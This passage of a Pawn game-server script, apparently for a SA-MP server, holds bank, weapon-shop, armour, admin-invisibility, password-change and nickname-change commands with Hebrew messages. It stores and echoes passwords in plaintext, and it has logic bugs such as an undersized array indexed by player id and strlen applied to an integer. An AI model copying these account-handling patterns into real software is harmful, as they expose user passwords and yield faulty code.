if(PlayerInfo[playerid][Bank] >= 10000000    && PlayerInfo[playerid][Level] == 9) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(PlayerInfo[playerid][Bank] >= 11000000  && PlayerInfo[playerid][Level] == 10) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(PlayerInfo[playerid][Bank] >= 12000000  && PlayerInfo[playerid][Level] == 11) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(PlayerInfo[playerid][Bank] >= 13000000  && PlayerInfo[playerid][Level] == 12) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(PlayerInfo[playerid][Bank] >= 14000000  && PlayerInfo[playerid][Level] == 13) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(PlayerInfo[playerid][Bank] >= 15000000 && PlayerInfo[playerid][Level] == 14) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(PlayerInfo[playerid][Bank] >= 16000000 && PlayerInfo[playerid][Level] == 15) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(PlayerInfo[playerid][Bank] >= 17000000 && PlayerInfo[playerid][Level] == 16) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(PlayerInfo[playerid][Bank] >= 18000000 && PlayerInfo[playerid][Level] == 17) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(PlayerInfo[playerid][Bank] >= 19000000 && PlayerInfo[playerid][Level] == 18) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(PlayerInfo[playerid][Bank] >= 20000000 && PlayerInfo[playerid][Level] == 19) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(PlayerInfo[playerid][Bank] >= 21000000 && PlayerInfo[playerid][Level] == 20) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(PlayerInfo[playerid][Bank] >= 22000000 && PlayerInfo[playerid][Level] == 21) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");


if(GetPlayerMoney(playerid) < moneysa[playerid]) return SendClientMessage(playerid, red, " אין לך מספיק כסף ");
LACY_GiveMoney(playerid, 0-moneysa[playerid]);
PlayerInfo[playerid][Bank] = PlayerInfo[playerid][Bank]+moneysa[playerid];
dini_IntSet(GetPlayerFile(playerid),"Bank",PlayerInfo[playerid][Bank]);
format(string, sizeof(string), ".$%d :הפקדת בחשבון הבנק שלך ,$%d :יש לך בחשבון הבנק", PlayerInfo[playerid][Bank], moneysa[playerid]);
SendClientMessage(playerid, COLOR_LIGHTGREEN, string);
return 1;
}

if(!strcmp(cmd,"/withdrawall",true))
{
if(!CPS_IsPlayerInCheckpoint(playerid,bcp)) return SendClientMessage(playerid,red,".אתה חייב להיות בבנק לביצוע פקודה זו");
if(dini_Int(GetPlayerFile(playerid),"Bank") < 1) return SendClientMessage(playerid,red,".אין לך כסף בבנק");
format(string,sizeof(string),".$%d :משכת את כל הכסף שהיה לך בבנק",dini_Int(GetPlayerFile(playerid),"Bank"));
SendClientMessage(playerid,LIGHTGREEN,string);
LACY_GiveMoney(playerid,dini_Int(GetPlayerFile(playerid),"Bank"));
PlayerInfo[playerid][Bank] = 0;
return dini_IntSet(GetPlayerFile(playerid),"Bank",0);
}


if(!strcmp(cmd, "/depositall", true))
{
if(!CPS_IsPlayerInCheckpoint(playerid,bcp)) return SendClientMessage(playerid,red,".אתה חייב להיות בבנק לביצוע פקודה זו");
if(GetPlayerMoney(playerid) < 0) return SendClientMessage(playerid, WHITE, " אין לך מספיק כסף ");
moneysa[playerid] = strval(tmp);
new GetCash[200];
GetCash[playerid] = GetPlayerMoney(playerid);

if(GetCash[playerid] >= 1000000 && PlayerInfo[playerid][Level] == 0 || PlayerInfo[playerid][Bank] >= 1000000       && PlayerInfo[playerid][Level] == 0) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(GetCash[playerid] >= 2000000 && PlayerInfo[playerid][Level] == 1 || PlayerInfo[playerid][Bank] >= 2000000       && PlayerInfo[playerid][Level] == 1) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(GetCash[playerid] >= 3000000 && PlayerInfo[playerid][Level] == 2 || PlayerInfo[playerid][Bank] >= 3000000       && PlayerInfo[playerid][Level] == 2) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(GetCash[playerid] >= 4000000 && PlayerInfo[playerid][Level] == 3 || PlayerInfo[playerid][Bank] >= 4000000     && PlayerInfo[playerid][Level] == 3) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(GetCash[playerid] >= 5000000 && PlayerInfo[playerid][Level] == 4 || PlayerInfo[playerid][Bank] >= 5000000     && PlayerInfo[playerid][Level] == 4) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(GetCash[playerid] >= 6000000 && PlayerInfo[playerid][Level] == 5 || PlayerInfo[playerid][Bank] >= 6000000     && PlayerInfo[playerid][Level] == 5) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(GetCash[playerid] >= 7000000 && PlayerInfo[playerid][Level] == 6 || PlayerInfo[playerid][Bank] >= 7000000     && PlayerInfo[playerid][Level] == 6) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(GetCash[playerid] >= 8000000 && PlayerInfo[playerid][Level] == 7 || PlayerInfo[playerid][Bank] >= 8000000     && PlayerInfo[playerid][Level] == 7) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(GetCash[playerid] >= 9000000 && PlayerInfo[playerid][Level] == 8 || PlayerInfo[playerid][Bank] >=   9000000     && PlayerInfo[playerid][Level] == 8 ) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(GetCash[playerid] >= 10000000 && PlayerInfo[playerid][Level] == 9 || PlayerInfo[playerid][Bank] >=  10000000    && PlayerInfo[playerid][Level] == 9) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(GetCash[playerid] >= 11000000 && PlayerInfo[playerid][Level] == 10 || PlayerInfo[playerid][Bank] >= 11000000  && PlayerInfo[playerid][Level] == 10) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(GetCash[playerid] >= 12000000 && PlayerInfo[playerid][Level] == 11 || PlayerInfo[playerid][Bank] >= 12000000  && PlayerInfo[playerid][Level] == 11) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(GetCash[playerid] >= 13000000 && PlayerInfo[playerid][Level] == 12 || PlayerInfo[playerid][Bank] >= 13000000  && PlayerInfo[playerid][Level] == 12) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(GetCash[playerid] >= 14000000 && PlayerInfo[playerid][Level] == 13 || PlayerInfo[playerid][Bank] >= 14000000  && PlayerInfo[playerid][Level] == 13) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(GetCash[playerid] >= 15000000 && PlayerInfo[playerid][Level] == 14 || PlayerInfo[playerid][Bank] >= 15000000 && PlayerInfo[playerid][Level] == 14) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(GetCash[playerid] >= 16000000 && PlayerInfo[playerid][Level] == 15 || PlayerInfo[playerid][Bank] >= 16000000 && PlayerInfo[playerid][Level] == 15) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(GetCash[playerid] >= 17000000 && PlayerInfo[playerid][Level] == 16 || PlayerInfo[playerid][Bank] >= 17000000 && PlayerInfo[playerid][Level] == 16) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(GetCash[playerid] >= 18000000 && PlayerInfo[playerid][Level] == 17 || PlayerInfo[playerid][Bank] >= 18000000 && PlayerInfo[playerid][Level] == 17) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(GetCash[playerid] >= 19000000 && PlayerInfo[playerid][Level] == 18 || PlayerInfo[playerid][Bank] >= 19000000 && PlayerInfo[playerid][Level] == 18) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(GetCash[playerid] >= 20000000 && PlayerInfo[playerid][Level] == 19 || PlayerInfo[playerid][Bank] >= 20000000 && PlayerInfo[playerid][Level] == 19) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(GetCash[playerid] >= 21000000 && PlayerInfo[playerid][Level] == 20 || PlayerInfo[playerid][Bank] >= 21000000 && PlayerInfo[playerid][Level] == 20) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");
if(GetCash[playerid] >= 22000000 && PlayerInfo[playerid][Level] == 21 || PlayerInfo[playerid][Bank] >= 22000000 && PlayerInfo[playerid][Level] == 21) return SendClientMessage(playerid,WHITE,"/deposit [amount] :החשבון בנק שלך מלא מידי עם יש לך הרבה כסף ביד השתמש בפקודה");

if(PlayerInfo[playerid][GetAloan] ==1) return format(string, sizeof(string),"%d :אתה חייב לבנק סכום כספי של",PlayerInfo[playerid][MoneyLoan]),SendClientMessage(playerid,red,string),SendClientMessage(playerid,red,".חסר לך כסף להחזרת ההלואה אנא אסוף תכסף והחזר לבנק עד אז לא תוכל להשתמש בבנק");
PlayerInfo[playerid][Bank] = PlayerInfo[playerid][Bank]+GetPlayerMoney(playerid);
dini_IntSet(GetPlayerFile(playerid),"Bank",PlayerInfo[playerid][Bank]);
format(string, sizeof(string), ".$%d :הפקדת בחשבון הבנק שלך ,$%d :יש לך בחשבון הבנק", PlayerInfo[playerid][Bank], GetPlayerMoney(playerid));
SendClientMessage(playerid, COLOR_LIGHTGREEN, string);
LACY_GiveMoney(playerid, 0-GetPlayerMoney(playerid));



return 1;
}
//====================Withdraw from Bank
if(!strcmp(cmd, "/withdraw", true))
{
if(!CPS_IsPlayerInCheckpoint(playerid,bcp)) return SendClientMessage(playerid,red,".אתה חייב להיות בבנק לביצוע פקודה זו");
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(tmp)) return SendClientMessage(playerid, COLOR_WHITE, "Usage: /withdraw [amount]");
moneysa[playerid] = strval(tmp);
if(20 < strlen(moneysa[playerid])) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(moneysa[playerid] < 1) return SendClientMessage(playerid, red, ".אתה חייב להכניס סכום יותר גדול מ 0  ");
moneysa[playerid] = strval(tmp);
if(moneysa[playerid] > PlayerInfo[playerid][Bank]) return SendClientMessage(playerid, WHITE, ".סכום משיכה שגוי ");
LACY_GiveMoney(playerid, moneysa[playerid]);
PlayerInfo[playerid][Bank] = PlayerInfo[playerid][Bank]-moneysa[playerid];
dini_IntSet(GetPlayerFile(playerid),"Bank",PlayerInfo[playerid][Bank]);
format(string, sizeof(string), ".$%d :נשאר לך בחשבון הבנק ,$%d :משכת מחשבון הבנק שלך",  moneysa[playerid],PlayerInfo[playerid][Bank]);
SendClientMessage(playerid, COLOR_LIGHTGREEN, string);
return 1;
}
//====================Balance
if(!strcmp(cmd, "/balance", true))
{
if(!CPS_IsPlayerInCheckpoint(playerid,bcp)) return SendClientMessage(playerid,red,".אתה חייב להיות בבנק לביצוע פקודה זו");
format(string, sizeof(string), "$%d :יש לך בבנק", PlayerInfo[playerid][Bank]);
SendClientMessage(playerid, COLOR_LIGHTGREEN, string);
return 1;
}





if(!strcmp(cmd,"/weaponlist",true) || !strcmp(cmd,"/WL",true))
{
if(!CPS_IsPlayerInCheckpoint(playerid,Ammu))
{
SendClientMessage(playerid, red, ".אתה חייב להיות בנקודת ציון על מנת להשתמש בפקודה זאת");
return 1;
}
SendClientMessage(playerid, red, "-:רשימת נשקים תמידיים --");
SendClientMessage(playerid, COLOR_YELLOW, "1.  /Bw 1 Sawnoff Shotgun 50000$ |2.    /Bw 2 MicroSMG 25000$");
SendClientMessage(playerid, COLOR_YELLOW, "3.  /Bw 3 Tec9 25000$            |4.    /Bw 4 M4 20000$");
SendClientMessage(playerid, COLOR_YELLOW, "5.  /Bw 5 MP5 30000$             |6.    /Bw 6 AK47 30000$");
SendClientMessage(playerid, COLOR_YELLOW, "7.  /Bw 7 Knife 10000$           |8.    /Bw 8 Katana 10000$");
SendClientMessage(playerid, COLOR_YELLOW, "9.  /Bw 9 Combat Shotgun 35000$  |10.   /Bw 10 Shotgun 10000$");
SendClientMessage(playerid, COLOR_YELLOW, "11. /Bw 11 Sniper Rifle 50000$   |12.   /Bw 12 Colt Pistol 10000$");
return 1;
}


if(!strcmp(cmd,"/buyarmour",true) || !strcmp(cmd,"/buyarmour",true))
{
if(PlayerInfo[playerid][Level] < 9) return Messagelevel(playerid,9);
if(!CPS_IsPlayerInCheckpoint(playerid,Ammu))
{
SendClientMessage(playerid, red, ".אתה חייב להיות בנקודת ציון על מנת להשתמש בפקודה זאת");
return 1;
}
if(GetPlayerMoney(playerid) < 100000) return SendClientMessage(playerid,red,".אין לך מספיק כסף לקנות את המגן התמידי הזה");
if(PlayerInfo[playerid][armourT] == 1) return SendClientMessage(playerid,red,".יש לך כבר מגן תמידי");

LACY_GiveMoney(playerid,-100000);


SetPlayerArmour(playerid,100);
PlayerInfo[playerid][armourT] = 1;
dini_IntSet(GetPlayerFile(playerid),"armour",PlayerInfo[playerid][armourT]);

SendClientMessage(playerid, COLOR_LIGHTGREEN, ".(armour),תתחדש/י קנית מגן תמידי");

return 1;
}
if(!strcmp(cmd,"/Sellarmour",true) || !strcmp(cmd,"/armourarmourarmour",true))
{
if(!CPS_IsPlayerInCheckpoint(playerid,Ammu))
{
SendClientMessage(playerid, red, ".אתה חייב להיות בנקודת ציון על מנת להשתמש בפקודה זאת");
return 1;
}
if(PlayerInfo[playerid][armourT] ==0) return SendClientMessage(playerid,WHITE,".אין בידך שלך מגן תמידי");
SetPlayerArmour(playerid,0);
PlayerInfo[playerid][armourT] = 0;

SendClientMessage(playerid, COLOR_LIGHTGREEN, ".זרקת את המגן שלך בהצלחה וקיבלת חצי מסכום הקנייה");
LACY_GiveMoney(playerid,50000);
return 1;
}
new Invis[MAX_PLAYERS]=0;
if(!strcmp(cmd, "/INV", true))
{
if(!IsPlayerXAdmin(playerid,1)) return 0;
SetPlayerColor(playerid, 0xFFFFFF00);
SendClientMessage(playerid, WHITE,"/uninv .כעת אתה שקוף במפה על מנת לחזור למצב רגיל");
Invis[playerid] =1;
return 1;
}
if(!strcmp(cmd, "/Spectator", true))
{
if(!IsPlayerXAdmin(playerid,1)) return 0;

Spectatorl[playerid] =1;
return 1;
}
if(!strcmp(cmd, "/unspectator", true))
{
if(!IsPlayerXAdmin(playerid,1)) return 0;

Spectatorl[playerid] =0;
return 1;
}
if(!strcmp(cmd, "/changepass", true))
{
new pass_new[256];
CheckPlayerCMDLevel(playerid,changepass);
pass_new = strtok(cmdtext, idx);
if(!IsPlayerLogged(playerid)) return SendClientMessage(playerid,WHITE,".אתה לא מחובר");
if(!strlen(pass_new)) return SendClientMessage(playerid,WHITE,"Usage: /changepass [password]");
if(30 < strlen(pass_new) || strlen(pass_new) < 3) return SendClientMessage(playerid,red,".30-3 אורך הסיסמה חייב להיות בין");
dini_Set(GetPlayerFile(playerid),"Password",pass_new);
format(string, sizeof(string), ".%s :הסיסמה שלך שונתה בהצלחה, סיסמה", pass_new);
SendClientMessage(playerid, COLOR_ORANGE, string);
return 1;
}


//if(!strcmp(cmd,"/SetNick",true) || !strcmp(cmd,"/changenick",true)) return SendClientMessage(playerid,WHITE,"!בקרוב");

if(!strcmp(cmd, "/changenick", true))
{
CheckPlayerCMDLevel(playerid,changenick);
new newnick[256];
newnick = strtok(cmdtext, idx);
if(20 < strlen(newnick)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(newnick)) return SendClientMessage(playerid,COLOR_WHITE,"Usage: /Changenick [new-name]");
if(20 < strlen(newnick)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(16 < strlen(newnick) || strlen(newnick) < 3) return SendClientMessage(playerid, red, ".אורך הכינוי חייב להיות ב3-16 תודה");
new CheackNick[256];
format(CheackNick,sizeof(CheackNick),"RLSB/Users/%s.ini",newnick);

if(dini_Exists(CheackNick))
{

format(string, sizeof(string), ".שם אשר משמש שחקן מהשרת %s השם ",newnick);
SendClientMessage(playerid, red, string);
return 1;
}
if(!IsNickValid(newnick)) return format(string, sizeof(string), ".הינו שם שמכיל תווים לא חוקיים, שנה תשם לתווים חוקיים,%s השם ",newnick),SendClientMessage(playerid, red, string);
//IsNickValid
new ClanGever[200];
new ClanGever2[256];
ClanGever2 = dini_Get(GetPlayerFile(playerid),"Clan");
ClanGever[playerid] = dini_Int(GetPlayerFile(playerid), "ClanLvl");
new savepass[256];
new sicq[256],smsn[256],smispht[256],ssex[256],semail[256];
savepass = dini_Get(GetPlayerFile(playerid),"Password");
sicq =  dini_Get(GetPlayerFile(playerid),"ICQ");
smsn =  dini_Get(GetPlayerFile(playerid),"Msn");
smispht =  dini_Get(GetPlayerFile(playerid),"Mispht");
ssex =  dini_Get(GetPlayerFile(playerid),"SEX");
semail =  dini_Get(GetPlayerFile(playerid),"Email");


dini_Remove(GetPlayerFile(playerid));
format(CheackNick,sizeof(CheackNick),"RLSB/Users/%s.ini",newnick);
dini_Create(CheackNick);
new File:f, date[3], time[3];
if(fexist(CheackNick))
{
f = fopen(CheackNick,io_append);
format(CheackNick,sizeof(CheackNick),"// %s's :חשבון השחקן \r\n",newnick); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"aKillsnl=%d\r\n",PlayerInfo[playerid][aKillsnl]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"aLevelnl=%d\r\n",PlayerInfo[playerid][aLevelnl]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"Organization=%s\r\n","None"); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"Clan=%s\r\n",ClanGever2); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"Password=%s\r\n",savepass); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"GemelLogin=%d\r\n",PlayerInfo[playerid][GemelLogin]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"KopatGemel=%d\r\n",PlayerInfo[playerid][KopatGemel]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"AggInfo=%d\r\n",PlayerInfo[playerid][AggInfo]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"Level=%d\r\n",PlayerInfo[playerid][Level]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"Tag=%s\r\n","סטלה בייבי"); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"Car=%s\r\n","None"); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"Logged=%d\r\n",PlayerInfo[playerid][Logged]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"IP=%s\r\n",GetIP(playerid)); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"LastConnectIP=%s\r\n",GetIP(playerid)); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"State=%s\r\n","Online"); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"RegisterationYear=%d\r\n",date[0]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"RegisterationMonth=%d\r\n",date[1]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"RegisterationDay=%d\r\n",date[2]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"RegisterationHour=%d\r\n",time[0]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"RegisterationMinute=%d\r\n",time[1]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"LastConnectYear=%d\r\n",date[0]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"LastConnectMonth=%d\r\n",date[1]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"LastConnectDay=%d\r\n",date[2]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"LastConnectHour=%d\r\n",time[0]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"LastConnectMinute=%d\r\n",time[1]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"Kills=%d\r\n",PlayerInfo[playerid][Kills]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"Deaths=%d\r\n",PlayerInfo[playerid][Deaths]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"Money=%d\r\n",PlayerInfo[playerid][Money]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"Bank=%d\r\n",PlayerInfo[playerid][Bank]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"Wars=%d\r\n",PlayerInfo[playerid][Wars]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"Karts=%d\r\n",PlayerInfo[playerid][Kart]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"MonsterWin=%d\r\n",PlayerInfo[playerid][Monster]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"MiniWin=%d\r\n",PlayerInfo[playerid][MINIGUN]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"RPGWIN=%d\r\n",PlayerInfo[playerid][RPGS]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"mlg=%d\r\n",PlayerInfo[playerid][Mlg]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"Adminl=%d\r\n",PlayerInfo[playerid][AdminsLevel]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"Warning=%d\r\n",PlayerInfo[playerid][Warnings]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"pWeeds=%d\r\n",PlayerInfo[playerid][Weeds]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"armour=%d\r\n",PlayerInfo[playerid][armourT]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"ProfileLogeed=%d\r\n",PlayerInfo[playerid][ProfileLogged]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"VIP=%d\r\n",PlayerInfo[playerid][VIPS]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"CC=%d\r\n",PlayerInfo[playerid][CcMode]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"Supportives=%d\r\n",PlayerInfo[playerid][Supportives]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"Tor=%d\r\n",PlayerInfo[playerid][Tor]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"Dolphin=%d\r\n",PlayerInfo[playerid][Dolp]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"Pets=%d\r\n",PlayerInfo[playerid][Pets]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"Shark=%d\r\n",PlayerInfo[playerid][Shark]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"SharkKills=%d\r\n",PlayerInfo[playerid][SharkKills]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"DolphinKills=%d\r\n",PlayerInfo[playerid][DolphinKills]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"TorKills=%d\r\n",PlayerInfo[playerid][TorKills]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"GetAloan=%d\r\n",PlayerInfo[playerid][GetAloan]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"MoneyLoan=%d\r\n",PlayerInfo[playerid][MoneyLoan]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"bazooka=%d\r\n",PlayerInfo[playerid][bazooka]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"TimeOnServer=%d\r\n",PlayerInfo[playerid][TimeOnServer]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"SavePos=%d\r\n",PlayerInfo[playerid][Saved]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"SavePosX=%.4f\r\n",PlayerInfo[playerid][SPX]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"SavePosY=%.4f\r\n",PlayerInfo[playerid][SPY]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"SavePosZ=%.4f\r\n",PlayerInfo[playerid][SPZ]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"SavePosI=%d\r\n",PlayerInfo[playerid][SPI]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"Saved=%d\r\n",PlayerInfo[playerid][Saved]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"SkinSavedId=%d\r\n",PlayerInfo[playerid][SkinSavedId]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"SaveSkin=%d\r\n",PlayerInfo[playerid][SaveSkin]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"SkinSaved=%d\r\n",PlayerInfo[playerid][SkinSaved]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"SaveStrika=%d\r\n",PlayerInfo[playerid][AirStrikeSaved]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"xAir=%d\r\n",PlayerInfo[playerid][xAirStrike]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"yAir=%d\r\n",PlayerInfo[playerid][yAirStrike]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"zAir=%d\r\n",PlayerInfo[playerid][zAirStrike]); fwrite(f,CheackNick);

format(CheackNick,sizeof(CheackNick),"ofidcarid=%d\r\n",pia[playerid][CarID]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"OFCARAR=%d\r\n",pia[playerid][OwnCar]); fwrite(f,CheackNick);
format(string,sizeof(string),"Sawn=%d\r\n",PlayerInfo[playerid][Sawn]); fwrite(f,string);
format(string,sizeof(string),"MicroSMG=%d\r\n",PlayerInfo[playerid][MicroSMG]); fwrite(f,string);
format(string,sizeof(string),"Tec9=%d\r\n",PlayerInfo[playerid][Tec9]); fwrite(f,string);
format(string,sizeof(string),"M4=%.4f\r\n",PlayerInfo[playerid][M4]); fwrite(f,string);
format(string,sizeof(string),"MP5=%.4f\r\n",PlayerInfo[playerid][MP5]); fwrite(f,string);
format(string,sizeof(string),"AK47=%.4f\r\n",PlayerInfo[playerid][AK47]); fwrite(f,string);
format(string,sizeof(string),"Knife=%d\r\n",PlayerInfo[playerid][Knife]); fwrite(f,string);
format(string,sizeof(string),"Katana=%d\r\n",PlayerInfo[playerid][Katana]); fwrite(f,string);
format(string,sizeof(string),"CombatShotGun=%d\r\n",PlayerInfo[playerid][CombatShotGun]); fwrite(f,string);
format(string,sizeof(string),"ShotGun=%d\r\n",PlayerInfo[playerid][ShotGun]); fwrite(f,string);
format(string,sizeof(string),"SniperRifle=%d\r\n",PlayerInfo[playerid][SniperRifle]); fwrite(f,string);
format(string,sizeof(string),"CRifle=%d\r\n",PlayerInfo[playerid][CRifle]); fwrite(f,string);
